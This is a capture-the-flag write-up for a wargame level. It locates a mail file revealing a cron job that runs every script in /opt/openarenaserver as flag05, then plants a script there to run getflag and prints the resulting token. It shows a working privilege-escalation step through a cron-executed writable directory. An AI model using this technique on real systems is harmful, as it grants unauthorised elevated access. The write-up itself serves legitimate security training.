in this level we have to connect to level05 direclty after we are going to receive a new mail.

so we are going to search for mail.

$>find / -name "mail"

[...]
find: /rofs/var/spool/cron/atspool: Permission denied
find: /rofs/var/spool/cron/crontabs: Permission denied
/rofs/var/spool/mail
find: /rofs/var/tmp: Permission denied
find: /rofs/var/www/level04: Permission denied
[...]

after we gonna check what that file have.

$>cat /var/spool/mail/level05 
$> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

we see that it is a crontab that execute a script every 2 minute ==> "sh /usr/sbin/openarenaserver" 
so lets check what /usr/sbin/openarenaserver have

$> cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

from the result we know that /usr/sbin/openarenaserver run every file inside /opt/openarenaserver than remove them.

so we are going to create a script in /opt/openarenaserver/ that run getflag then send the result to another file in /tmp
$> echo "getflag > /tmp/hash" > script.sh && chmod 777 script.sh

$>cat /tmp/hash
Check flag.Here is your token : viuaaale9huek52boumoomioc
